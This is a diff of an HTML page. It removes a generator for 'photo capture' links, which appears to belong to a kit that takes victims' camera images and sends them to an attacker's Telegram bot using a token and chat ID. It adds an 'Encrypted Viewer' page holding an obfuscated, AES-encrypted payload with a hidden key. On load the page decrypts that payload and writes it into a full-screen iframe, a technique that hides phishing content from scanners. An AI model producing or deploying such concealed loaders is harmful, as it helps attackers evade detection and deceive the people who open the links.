@@ -1,60 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Photo Capture Link Generator</title>
-    <meta charset="utf-8">
-    <style>
-        body { font-family: Arial, sans-serif; display:flex; flex-direction:column; align-items:center; margin:40px;}
-        .container{max-width:350px;width:100%;border:1px solid #ddd;padding:24px;border-radius:8px;}
-        input,button{margin-top:10px;padding:10px;width:100%;box-sizing:border-box;}
-        #result{margin-top:20px;word-break:break-all;}
-    </style>
+<meta charset="utf-8">
+<title>Encrypted Viewer</title>
+<style>html,body{margin:0;height:100%;}</style>
 </head>
 <body>
-    <div class="container">
-        <h2>Make Your Capture Link</h2>
-        <input type="text" id="token" placeholder="Telegram Bot Token" required>
-        <input type="text" id="chatid" placeholder="Telegram Chat ID" required>
-        <input type="text" id="redirect" placeholder="Redirect URL (e.g. https://example.com)" required>
-        <button onclick="saveData()">Save</button>
-        <button onclick="generate()">Generate Link</button>
-        <div id="result"></div>
-    </div>
-    <script>
-        // Load data from localStorage when page opens
-        window.onload = function() {
-            document.getElementById('token').value = localStorage.getItem('photo_token') || '';
-            document.getElementById('chatid').value = localStorage.getItem('photo_chatid') || '';
-            document.getElementById('redirect').value = localStorage.getItem('photo_redirect') || '';
-        };
+<script type="application/octet-stream" id="payload">nZioBYZ[kIXCzYZ[IBUpMYZ[V8LELYZ[MzMXxYZ[qIB::YZ[CB[HYYZ[CjWheYZ[vuMxcYZ[:pGmiYZ[sXgXwYZ[gkOU:YZ[7rhvFYZ[75X[CYZ[puqQTYZ[3PGjrYZ[{HZldYZ[3tQNYYZ[qq5cqYZ[kuobOYZ[fHxuHYZ[fI{LxYZ[2NqEUYZ[0KOywYZ[VGF2WYZ[vv6ynYZ[{2bTcYZ[poOevYZ[g0{xwYZ[[lh0OYZ[8I,lUYZ[tmYbjYZ[h2h6,YZ[CTNrPYZ[u9zMpYZ[W,toYYZ[tVhMpYZ[ugH00YZ[4Ek1wYZ[j2nmrYZ[m5NKCYZ[dnEsNYZ[ES,o9YZ[b8gQLYZ[{BX[eYZ[0L3VHYZ[PR27:YZ[vQVVRYZ[DO9{EYZ[Q13[qYZ[S4Q:,YZ[nQi1DYZ[HqqmIYZ[EMM1GYZ[O3nrxYZ[nwuEUYZ[d29tVYZ[[zMTmYZ[fwWZnYZ[qL:RJYZ[6VY9CYZ[DeKwcYZ[fuEoMYZ[5KoxJYZ[NWVCkYZ[:3PqNYZ[s9IzIYZ[E1:LZYZ[K{,LfYZ[Wp[EPYZ[:Wb{WYZ[R1fnEYZ[ktNtvYZ[XWowlYZ[F6DrBYZ[W1TLmYZ[NcMXyYZ[tGcctYZ[5VObRYZ[EYK:vYZ[FTQ,vYZ[O5j19YZ[IVfQ7YZ[p8YeNYZ[zBgnRYZ[LDI5,YZ[kLM6zYZ[wNqEmYZ[:SZTbYZ[Y5gOIYZ[r1McpYZ[i1ZbUYZ[23FGCYZ[gXtDhYZ[YlldwYZ[tDv1FYZ[d{7MsYZ[8cxCPYZ[GVYrXYZ[hcpqWYZ[jur:zYZ[KPsW2YZ[I6HCDYZ[B9O6bYZ[U3gNEYZ[DUgZ2YZ[{hYoQYZ[fg17VYZ[BPrPiYZ[RUggnYZ[olc:4YZ[E0VBpYZ[V05bcYZ[9fQ7SYZ[pZZSMYZ[11FO7YZ[pzdD6YZ[eGnQMYZ[pEboeYZ[iCB3sYZ[WGM3,YZ[2,NXUYZ[v9MvrYZ[Uij,LYZ[k{RoOYZ[7CBGSYZ[cKEJ{YZ[hwFctYZ[YKj5YYZ[bfmIfYZ[V3::VYZ[z[JzMYZ[o3RruYZ[yyWRJYZ[NFylhYZ[rWGSqYZ[[jruiYZ[OPLf4YZ[q1:jVYZ[L9gZxYZ[t0ILUYZ[P7PBLYZ[N6WPMYZ[XoN7uYZ[ZtNdKYZ[2flz3YZ[LN459YZ[sUsecYZ[EWQvQYZ[Hx8W:YZ[dZOgTYZ[eS3exYZ[bRG3kYZ[M9g8kYZ[fi35tYZ[2RV:WYZ[fbYjoYZ[fuUkvYZ[fRGE6YZ[sxo3IYZ[SlVrcYZ[e2zR4YZ[DE2yHYZ[QM,WHYZ[eZUN5YZ[lox,ZYZ[CVkkFYZ[ZSgi0YZ[:44t6YZ[HX8HyYZ[{LEoRYZ[BgnJCYZ[H475nYZ[{y11vYZ[o:RV9YZ[RNwVwYZ[SudeQYZ[f1i6zYZ[QyqwkYZ[R,RvhYZ[kW:kTYZ[FXl4vYZ[fibieYZ[Dgu2YYZ[6ucIMYZ[SEkQFYZ[2yfgPYZ[4UlHIYZ[8R0IrYZ[FiG2mYZ[{VttjYZ[en6z9YZ[id7tRYZ[tzLKeYZ[[51j2YZ[HsYNlYZ[VB,ooYZ[jXeOQYZ[xx3ujYZ[0YZxmYZ[s[W1CYZ[:E37xYZ[ZwcBHYZ[zob0nYZ[Fip1dYZ[wPxu2YZ[En:d0YZ[q8:UZYZ[SbMwVYZ[FPyzXYZ[O[jSuYZ[IGV2pYZ[1m8l7YZ[6yX6[YZ[YKxiZYZ[BcQz{YZ[SGdekYZ[Sxxp3YZ[PbVN[YZ[l6X24YZ[WftYdYZ[CcJgsYZ[vuglcYZ[iV18:YZ[dccN6YZ[od[tqYZ[5{BldYZ[eLgNZYZ[qUcPqYZ[lEUR9YZ[hpDIPYZ[SP5CEYZ[51xmdYZ[d{:JgYZ[{oIhRYZ[46t9iYZ[Wp3yPYZ[[,wg0YZ[nxcm[YZ[Z5rB2YZ[6M44,YZ[83sSGYZ[yqyfBYZ[u5cCDYZ[D60c3YZ[LVg6LYZ[qKXtJYZ[p0et{YZ[57VyPYZ[1g4,CYZ[Lg6zfYZ[6BRc[YZ[wdMb9YZ[BYbW7YZ[oyJwxYZ[zySdYYZ[cC1[EYZ[G8GKqYZ[tdqLxYZ[wxt0QYZ[0zsn4YZ[WI43XYZ[PK,rTYZ[2R,{IYZ[SHIlVYZ[B:8mqYZ[kRxeNYZ[3Xxh7YZ[xSS8rYZ[inbt1YZ[W5ibQYZ[GFlBQYZ[OMbq,YZ[{v:6dYZ[[Pyg1YZ[cG5XdYZ[HwZcdYZ[iBp,sYZ[8[OQnYZ[j2Hy9YZ[B[tkKYZ[hZ81FYZ[egnSZYZ[RfQEMYZ[Gn6CeYZ[ywQ3gYZ[:5FIhYZ[EHIrTYZ[1oH4uYZ[cZN7nYZ[Gfc:pYZ[,ZwE5YZ[4E5c1YZ[9ck8{YZ[5:CPNYZ[B,l4TYZ[u:wFsYZ[98EqfYZ[HTiWXYZ[8MJ7UYZ[E7{FMYZ[NBgWrYZ[Dn1odYZ[i47izYZ[RQKckYZ[tm64RYZ[i0RfBYZ[8oSmcYZ[TvFMMYZ[gYvXZYZ[XhZo4YZ[JHXYWYZ[Ou6luYZ[ich{zYZ[eM9bEYZ[psd4TYZ[Xuj4GYZ[umgF3YZ[2l4NzYZ[iVyQUYZ[5BIUeYZ[Kq3n:YZ[T8znuYZ[t,L4VYZ[F1blHYZ[{Ri3{YZ[kTN9SYZ[pH290YZ[PyYklYZ[ntEiwYZ[H926BYZ[d7rLiYZ[fETcqYZ[rCHfkYZ[r1F2YYZ[DSeqfYZ[z:jStYZ[NPBz1YZ[:7C,bYZ[P{qb4YZ[2jgNsYZ[NGTBmYZ[buK,EYZ[8r:rqYZ[klB:zYZ[d5GmtYZ[FjvmUYZ[lObi,YZ[To4nCYZ[f2n6RYZ[UIDYMYZ[fwnzwYZ[c2tZ3YZ[tzYsSYZ[UiqV[YZ[N0e:rYZ[GqrD:YZ[w2NgMYZ[xoR,rYZ[PYov9YZ[NcQD9YZ[S7Md5YZ[QgfIeYZ[N48{QYZ[GpLZ0YZ[WT8[eYZ[xmdnxYZ[75gEiYZ[,{jNHYZ[VfQ,eYZ[4VfdIYZ[JGI:9YZ[QitRpYZ[oq2q7YZ[dPIroYZ[VypSzYZ[mJ5W9YZ[uloyIYZ[p4kmOYZ[O2pPYYZ[XQhokYZ[sHpp2YZ[kzyQWYZ[yeXEiYZ[pCFOoYZ[buQvmYZ[jN4upYZ[RVMpWYZ[TmiMiYZ[qIQGfYZ[2mJpnYZ[LEnyZYZ[5EQsmYZ[IphvQYZ[6CJliYZ[9J0ZGYZ[qC9ghYZ[yMLhuYZ[u1r26YZ[tzH7iYZ[7KmeRYZ[ms41IYZ[nOyt2YZ[KhCTDYZ[jxMtvYZ[PsNBgYZ[UEzn1YZ[2JrUjYZ[1rsgZYZ[hMwucYZ[BfXp1YZ[ux1WEYZ[qVKpBYZ[CYkYOYZ[rLqDCYZ[Hr0CzYZ[DO:TvYZ[XzpunYZ[xWKUnYZ[1:SCjYZ[gmFf7YZ[xukJ9YZ[GJ75GYZ[3dCijYZ[01khrYZ[3eeePYZ[mMN7eYZ[Bfk{PYZ[YvYWlYZ[e8::JYZ[p5RzvYZ[n06cjYZ[msTBUYZ[dO[XKYZ[qWCZnYZ[Q,6uxYZ[WWROyYZ[9E[:{YZ[cGMbWYZ[EZ6kiYZ[oRXjjYZ[oc9y9YZ[eTCFpYZ[rWnu:YZ[O0iSpYZ[pil02YZ[JockLYZ[{tV79YZ[OqfpnYZ[3L8YuYZ[qnlXUYZ[PpmQnYZ[YegIcYZ[O1yGsYZ[M:6L6YZ[QgjjuYZ[7LUFVYZ[VEI:SYZ[fiBQ2YZ[7yXfPYZ[nrxYtYZ[{XuxTYZ[R4ed2YZ[:xyBhYZ[0j3:zYZ[{Vtx2YZ[5Z:3zYZ[YLBiYYZ[qyEYdYZ[{mHtCYZ[gzQ[tYZ[27mVnYZ[VF1joYZ[cWntcYZ[J7TknYZ[SgZV{YZ[12L6{YZ[Ht,X:YZ[{qe82YZ[[PPDUYZ[vTJidYZ[WSi,CYZ[TlgCgYZ[c[H7VYZ[99MCfYZ[25tnpYZ[n5norYZ[tRe2QYZ[PBOMuYZ[58O6vYZ[W1ONlYZ[E1P{MYZ[G:O2gYZ[Fqc1yYZ[ImRZOYZ[pSM2WYZ[vXvoOYZ[B88IzYZ[Oj6XkYZ[N4kigYZ[E,n4vYZ[Kqs7NYZ[NE0H5YZ[M0wJHYZ[rIWg9YZ[jYzNpYZ[5OiXoYZ[CE[xsYZ[BbZ7[YZ[iRv,HYZ[ugh[LYZ[BH0tXYZ[09r,YYZ[{Nv8YYZ[ZS2C4YZ[XjhcNYZ[:w1,{YZ[piHj1YZ[kFnQ6YZ[hVTqZYZ[UFHfZYZ[VVrcSYZ[sEO7bYZ[8m8r,YZ[Z,Z9CYZ[lQ2GfYZ[E{rdYYZ[W2TTCYZ[WWKEOYZ[E3,4MYZ[ZVoLgYZ[pjltTYZ[nES7wYZ[uWjzyYZ[wN,oRYZ[E1zyGYZ[S[kyrYZ[CPwziYZ[7B:eYYZ[2[iECYZ[LIlQ9YZ[CDM5CYZ[{fNxGYZ[CXcI6YZ[XGP8FYZ[7FxpUYZ[Ti7N6YZ[H6,r3YZ[{cbIrYZ[RgrNjYZ[UuCGlYZ[xrJW4YZ[{Ib8mYZ[p0:06YZ[ik8[YYZ[RG4KfYZ[6qMSmYZ[8GbKxYZ[J4fOVYZ[GNt3QYZ[X,h1:YZ[tFJ{DYZ[Sld16YZ[8WOW3YZ[C3HrjYZ[sZ{p7YZ[uMI7VYZ[evWiyYZ[B9RfcYZ[eY5uWYZ[pbJu2YZ[Stb1GYZ[BOF:LYZ[Cw:GnYZ[D,1RWYZ[DBteTYZ[quwl[YZ[:t4FzYZ[Tg41{YZ[br,3kYZ[mNSyvYZ[iWDqsYZ[YDWrcYZ[ysq6jYZ[[fP{qYZ[7QTV6YZ[DEjzkYZ[e0l58YZ[ovC[OYZ[NdvFjYZ[t3W58YZ[Ed1vgYZ[viXkBYZ[rff0MYZ[k:z:GYZ[shjEGYZ[hVbt3YZ[[{TjrYZ[llXonYZ[sF1mcYZ[[50OYYZ[VUuPfYZ[4GywHYZ[w,dINYZ[fdCo1YZ[2oIeiYZ[SsmvrYZ[DpbxTYZ[CMZtfYZ[5kqIUYZ[wFoQ0YZ[R:y9BYZ[:xJ5nYZ[nTUYoYZ[[NeH:YZ[D6{biYZ[H{rlUYZ[4qyBfYZ[mKBzKYZ[:gGRwYZ[WdL01YZ[vz8ZDYZ[K3BF,YZ[mPOYMYZ[chQhjYZ[:Xt6uYZ[{2yIvYZ[0[48jYZ[Pp8l7YZ[N,Y,BYZ[tLis2YZ[IB1M5YZ[swrGZYZ[OnmCdYZ[rYDG3YZ[8u[qzYZ[scte9YZ[7qt5RYZ[1OXwnYZ[hNWrfYZ[HJsnpYZ[Zf:CcYZ[F99ftYZ[UvO4IYZ[5GyqEYZ[JjTNlYZ[Rq7grYZ[,he{5YZ[On{L1YZ[TtqqGYZ[[9wxbYZ[lebBQYZ[Pxi3LYZ[0sVQlYZ[T,DU3YZ[feneyYZ[mkoSFYZ[XKZjnYZ[drG,bYZ[:Z,GNYZ[9ujxEYZ[m3gK6YZ[8xm7eYZ[DCkDfYZ[zhEGTYZ[,LkMHYZ[1MSHcYZ[U7sk2YZ[quqs5YZ[VDIY3YZ[PDSiYYZ[oiVI5YZ[dk85:YZ[OS5M5YZ[L{XxJYZ[UxyJCYZ[ONEujYZ[zwpHYYZ[UyRN[YZ[GPnDPYZ[PWCQ4YZ[K527pYZ[WReIvYZ[P3erXYZ[O[eolYZ[,2J[oYZ[KqOmNYZ[:rfTDYZ[YYRQpYZ[k2MvlYZ[pgKqYYZ[RPE3fYZ[ExuQNYZ[K5zlQYZ[z2WvoYZ[UvT4pYZ[BxTuqYZ[b7oW1YZ[FglwTYZ[L4DucYZ[2[yFqYZ[lhB8OYZ[06C7RYZ[dP0kQYZ[Kwn8HYZ[2fv0yYZ[u2DPGYZ[GYPefYZ[658JiYZ[7ygdSYZ[xKQunYZ[svPz3YZ[3FEVSYZ[s6pMJYZ[5TzX6YZ[9hWq4YZ[Ol3f:YZ[5uvUeYZ[dGnqJYZ[xnKSzYZ[qg{QHYZ[qoxhXYZ[Y7segYZ[OSI2YYZ[U5HZxYZ[Cg127YZ[IvObsYZ[jnBpNYZ[{PSnbYZ[yDJf0YZ[IMXvrYZ[xHfccYZ[rwKS8YZ[Fbs{UYZ[,sn9LYZ[SmIc5YZ[XF0E4YZ[vxWptYZ[pLP5TYZ[I3R4ZYZ[t9r2QYZ[9k9nuYZ[FZ3KkYZ[OVeqoYZ[0LYC6YZ[3zIOKYZ[WS[snYZ[bD{[dYZ[7yYh6YZ[Sn{JLYZ[feRVIYZ[TSklsYZ[[UtbVYZ[xQn2XYZ[mXTP7YZ[ntZKyYZ[gR9z9YZ[He3{LYZ[QHlzBYZ[mKJcCYZ[C2u73YZ[x7rV,YZ[4mnzuYZ[bpP,wYZ[D4T0fYZ[wxCMiYZ[lktM:YZ[IMJMXYZ[2uTtzYZ[Rj3JUYZ[:N[kkYZ[Nbf9cYZ[L35dBYZ[wFeLKYZ[Uwt[xYZ[B6ElwYZ[n,1etYZ[sn6W3YZ[:u7:SYZ[snMuhYZ[ED8IiYZ[pQJVqYZ[NEtL1YZ[DxFSeYZ[MthZhYZ[OSmSQYZ[42suSYZ[kJvSkYZ[6VNv8YZ[99,08YZ[[b{UfYZ[FYewKYZ[:etnrYZ[HTPXMYZ[ecU0eYZ[ewmQZYZ[gVRWQYZ[1wLffYZ[NbbdpYZ[ztM5rYZ[6X6GNYZ[VPrcyYZ[3sD89YZ[ticNvYZ[V0mzWYZ[gmZfWYZ[5Q,uVYZ[:mgDhYZ[</script>
+<script>
+function getKey(obf){
+  let a=[...obf].map(c=>String.fromCharCode(c.charCodeAt(0)-3)).join('');
+  return atob(a.split('').reverse().join(''));
+}
+(async () => {
+  let enc = document.getElementById('payload').textContent.trim();
 
-        function saveData() {
-            const token = document.getElementById('token').value.trim();
-            const chat = document.getElementById('chatid').value.trim();
-            const redirect = document.getElementById('redirect').value.trim();
-            if (!token || !chat || !redirect) {
-                alert("Please Enter Token, Chat ID, and Redirect URL to save");
-                return;
-            }
-            localStorage.setItem('photo_token', token);
-            localStorage.setItem('photo_chatid', chat);
-            localStorage.setItem('photo_redirect', redirect);
-            alert('Saved! Now these values will auto-fill next time.');
-        }
+  enc = enc.split('').map(c => String.fromCharCode((c.charCodeAt(0) - 1 + 256) % 256)).join('');
+  enc = enc.replace(/XYZ/g, '');
+  enc = enc.split('').reverse().join('');
+  enc = atob(enc);
 
-        function generate() {
-            const token = encodeURIComponent(document.getElementById('token').value.trim());
-            const chat = encodeURIComponent(document.getElementById('chatid').value.trim());
-            const redirect = encodeURIComponent(document.getElementById('redirect').value.trim());
-            if (!token || !chat || !redirect) {
-                alert("Please Enter Token, Chat ID, and Redirect URL");
-                return;
-            }
-            // Change the base URL if needed, default: same folder
-            const baseUrl = location.origin + location.pathname.replace('index.html', '') + 'nobita.html';
-            const link = `${baseUrl}?token=${token}&chat=${chat}&redirect=${redirect}`;
-            document.getElementById('result').innerHTML = `<b>Your Link:</b><br><a href="${link}" target="_blank">${link}</a>`;
-        }
-    </script>
+  const buf = Uint8Array.from(enc, c => c.charCodeAt(0));
+  const salt = buf.slice(0, 16);
+  const iv = buf.slice(16, 28);
+  const tag = buf.slice(28, 44);
+  const ct = buf.slice(44);
+
+  const full = new Uint8Array(ct.length + tag.length);
+  full.set(ct);
+  full.set(tag, ct.length);
+
+  const keyStr = getKey("@@DP4L}Q");
+  const keyMat = await crypto.subtle.importKey(
+    'raw',
+    new TextEncoder().encode(keyStr),
+    'PBKDF2',
+    false,
+    ['deriveKey']
+  );
+
+  const key = await crypto.subtle.deriveKey(
+    {
+      name: 'PBKDF2',
+      salt: salt,
+      iterations: 200000,
+      hash: 'SHA-256'
+    },
+    keyMat,
+    { name: 'AES-GCM', length: 256 },
+    false,
+    ['decrypt']
+  );
+
+  const plain = await crypto.subtle.decrypt(
+    { name: 'AES-GCM', iv: iv, tagLength: 128 },
+    key,
+    full
+  );
+
+  const html = new TextDecoder().decode(plain);
+
+  const iframe = document.createElement('iframe');
+  iframe.style = 'border:0;width:100vw;height:100vh;position:fixed;top:0;left:0;';
+  document.body.appendChild(iframe);
+  iframe.contentDocument.open();
+  iframe.contentDocument.write(html);
+  iframe.contentDocument.close();
+})();
+</script>
+<noscript>JavaScript is required to view the encrypted content.</noscript>
 </body>
 </html>
